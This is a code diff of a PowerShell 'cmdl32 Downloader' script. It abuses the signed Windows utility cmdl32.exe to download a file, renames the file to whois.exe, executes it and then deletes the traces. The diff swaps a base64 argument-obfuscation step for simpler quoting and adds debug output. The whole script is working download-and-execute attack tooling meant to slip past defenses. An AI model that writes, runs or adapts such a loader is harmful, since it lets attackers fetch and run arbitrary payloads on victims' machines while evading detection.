@@ -1,4 +1,5 @@
 Write-Host "[-] cmdl32 Downloader - liquidsky ^_~"
+
 # Create a temp directory to work in
 $tempDir = Join-Path -Path $env:TEMP -ChildPath "cmdl32_temp"
 New-Item -Path $tempDir -ItemType Directory -Force
@@ -47,18 +48,12 @@ if (!(Test-Path -Path $cmdl32TempPath)) {
 
 Write-Host "[*] Using cmdl32.exe at: $cmdl32TempPath"
 
-# Obfuscate the flags for cmdl32 and use string encoding to hide command structure
-$commandToRun = "/vpn /lan `"$tempDir\settings.txt`""
-Write-Host "[*] Base64 encoding command: $commandToRun"
-$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($commandToRun))
+# Define the arguments with obfuscation using quotes within the command
+$arguments = "/c $cmdl32TempPath /vpn /lan `"$tempDir\settings.txt`""
 
-Write-Host "[*] Encoded Command: $encodedCommand"
-
-# Construct cmd.exe argument to decode and execute the base64 command
-$arguments = "/c $cmdl32TempPath /v`"p`"n /l`"a`"n `"$encodedCommand`""
 Write-Host "[*] Starting cmd.exe with obfuscated arguments: $arguments"
 
-# Start cmd.exe with the obfuscated cmdl32 arguments
+# Start cmd.exe to execute cmdl32
 try {
     Start-Process -FilePath "cmd.exe" -ArgumentList $arguments -NoNewWindow -Wait
     Write-Host "[*] Download complete with cmdl32."
@@ -72,16 +67,23 @@ try {
 Write-Host "[*] Reverting permissions"
 icacls $tempDir /remove:d "$env:USERNAME"
 
+# Debugging: List all files in the temp directory to check if the download succeeded
+Write-Host "[*] Listing files in $tempDir:"
+Get-ChildItem -Path $tempDir
+
 Write-Host "[*] Renaming downloaded file for execution"
 # Find the downloaded file (VPN*.tmp)
-$downloadedFile = Get-ChildItem -Path $tempDir -Filter "VPN*.tmp" | Select-Object -First 1
+$downloadedFile = Get-ChildItem -Path $tempDir -Filter "*.tmp" | Select-Object -First 1
 if ($downloadedFile) {
     Write-Host "[*] Downloaded file found: $($downloadedFile.FullName)"
     
     # Construct the target path for renaming the file
     $targetPath = Join-Path -Path $tempDir -ChildPath "whois.exe"
     
-    # Rename (or move) the downloaded file
+    # Debug output: Check the target path
+    Write-Host "[*] Target path: $targetPath"
+    
+    # Try renaming (or moving) the file using Move-Item
     try {
         Move-Item -Path $downloadedFile.FullName -Destination $targetPath -Force
         Write-Host "[*] Renamed (moved) VPN*.tmp to whois.exe."
@@ -90,13 +92,13 @@ if ($downloadedFile) {
         Exit
     }
 } else {
-    Write-Host "[!] No downloaded file found matching 'VPN*.tmp'. Exiting script."
+    Write-Host "[!] No downloaded file found matching '*.tmp'. Exiting script."
     Exit
 }
 
 Write-Host "[*] Executing the downloaded file"
-# Execute the renamed file
 if (Test-Path "$tempDir\whois.exe") {
+    Write-Host "[*] Executing the file $tempDir\whois.exe"
     Start-Process -FilePath "$tempDir\whois.exe" -NoNewWindow -Wait
     Write-Host "[*] Execution complete."
 } else {
@@ -105,7 +107,6 @@ if (Test-Path "$tempDir\whois.exe") {
 }
 
 Write-Host "[*] Cleaning up downloaded file"
-# Clean up downloaded files
 Remove-Item -Path "$tempDir\whois.exe" -Force
 Remove-Item -Path "$tempDir\settings.txt" -Force
 Write-Host "[*] Script complete."
